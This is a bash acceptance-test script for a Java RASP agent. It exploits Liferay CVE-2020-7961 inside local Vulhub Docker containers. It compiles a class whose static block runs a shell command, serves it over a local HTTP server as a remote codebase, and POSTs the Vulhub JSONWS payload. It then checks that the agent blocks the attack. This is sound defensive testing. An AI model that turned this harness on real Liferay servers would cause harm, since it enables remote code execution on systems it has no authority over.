#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_LIFERAY_7961_IMAGE:-vulhub/liferay-portal:7.2.0-ga1}"
baseline_name="${OHMYRASP_VULHUB_LIFERAY_7961_BASELINE_NAME:-ohmyrasp-vulhub-liferay-7961-baseline}"
protected_name="${OHMYRASP_VULHUB_LIFERAY_7961_PROTECTED_NAME:-ohmyrasp-vulhub-liferay-7961-protected}"
baseline_port="${OHMYRASP_VULHUB_LIFERAY_7961_BASELINE_PORT:-18538}"
protected_port="${OHMYRASP_VULHUB_LIFERAY_7961_PROTECTED_PORT:-18539}"
http_port="${OHMYRASP_VULHUB_LIFERAY_7961_HTTP_PORT:-8000}"
readme="${OHMYRASP_VULHUB_LIFERAY_7961_README:-/tmp/vulhub-ohmyrasp-20260603/liferay-portal/CVE-2020-7961/README.md}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-liferay-7961-java8-baseline"
protected_dir="logs/vulhub-liferay-7961-java8-protected"
payload_dir="logs/vulhub-liferay-7961-java8-payload"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-liferay-7961-success"

if [[ ! -f "$readme" ]]; then
  echo "missing Vulhub Liferay CVE-2020-7961 README: ${readme}" >&2
  exit 1
fi
if ss -ltn "sport = :${http_port}" | grep -q LISTEN; then
  echo "port ${http_port} is required by the fixed Vulhub C3P0 payload and is already in use" >&2
  exit 1
fi

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cat > "${payload_dir}/LifExp.java" <<'JAVA'
public class LifExp {
  static {
    try {
      String[] cmd = {"bash", "-c", "touch /tmp/ohmyrasp-liferay-7961-success"};
      java.lang.Runtime.getRuntime().exec(cmd).waitFor();
    } catch (Exception exception) {
      exception.printStackTrace();
    }
  }
}
JAVA

docker run --rm -v "$(pwd)/${payload_dir}:/work" -w /work gradle:jdk25 \
  javac --release 8 LifExp.java

python3 -m http.server "$http_port" --bind 0.0.0.0 \
  --directory "$(pwd)/${payload_dir}" > "${payload_dir}/http.log" 2>&1 &
http_pid="$!"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  if [[ -n "${http_pid:-}" ]]; then
    kill "$http_pid" >/dev/null 2>&1 || true
    wait "$http_pid" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 600); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" =~ ^(200|302)$ ]]; then
      return
    fi
    if ! docker ps --format '{{.Names}}' | grep -q "^${name}$"; then
      echo "${name} exited before readiness" >&2
      docker logs "$name" 2>&1 | tail -180 >&2 || true
      exit 1
    fi
    sleep 1
  done
  echo "${name} did not expose Liferay root at ${port}" >&2
  docker logs "$name" 2>&1 | tail -220 >&2 || true
  exit 1
}

post_payload() {
  local port="$1"
  local output_dir="$2"
  python3 - "$readme" "$port" "$output_dir" <<'PY'
import re
import sys
import urllib.error
import urllib.request
from pathlib import Path

readme, port, output_dir = sys.argv[1:]
text = Path(readme).read_text(encoding="utf-8")
match = re.search(r"\n(cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22.*?\})\n```", text, re.S)
if not match:
    raise SystemExit("could not extract Liferay CVE-2020-7961 payload body")
body = match.group(1).encode("utf-8")
Path(output_dir, "attack.body").write_bytes(body)
request = urllib.request.Request(
    f"http://127.0.0.1:{port}/api/jsonws/invoke",
    data=body,
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "ohmyrasp-liferay-7961",
    },
    method="POST",
)
try:
    with urllib.request.urlopen(request, timeout=60) as response:
        data = response.read()
        status = response.status
        headers = dict(response.headers)
except urllib.error.HTTPError as error:
    data = error.read()
    status = error.code
    headers = dict(error.headers)
Path(output_dir, "attack.response").write_bytes(data)
Path(output_dir, "attack.status").write_text(str(status), encoding="utf-8")
Path(output_dir, "attack.headers").write_text(
    "\n".join(f"{key}: {value}" for key, value in headers.items()), encoding="utf-8")
print(status)
PY
}

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for "$baseline_name" "$baseline_port"
docker exec "$baseline_name" rm -f "$marker" >/dev/null
post_payload "$baseline_port" "$baseline_dir" >/dev/null
sleep 5
if ! docker exec "$baseline_name" test -e "$marker"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  cat "${payload_dir}/http.log" >&2 || true
  echo "baseline Liferay CVE-2020-7961 did not create ${marker}" >&2
  exit 1
fi
if ! grep -q 'GET /LifExp.class' "${payload_dir}/http.log"; then
  cat "${payload_dir}/http.log" >&2 || true
  echo "baseline Liferay CVE-2020-7961 did not request LifExp.class" >&2
  exit 1
fi
docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
docker rm -f "$baseline_name" >/dev/null 2>&1 || true

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e LIFERAY_JVM_OPTS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for "$protected_name" "$protected_port"
sleep 5
if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Liferay protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Liferay protected startup/readiness produced a detection before exploit request" >&2
  exit 1
fi

docker exec "$protected_name" rm -f "$marker" >/dev/null
post_payload "$protected_port" "$protected_dir" >/dev/null
sleep 5
if docker exec "$protected_name" test -e "$marker"; then
  echo "protected Liferay CVE-2020-7961 created ${marker} despite Java8 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_classloader_remote_codebase".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_classloader_remote_codebase block event for Liferay CVE-2020-7961" >&2
  exit 1
fi

echo "vulhub Liferay CVE-2020-7961 Java8 acceptance passed"
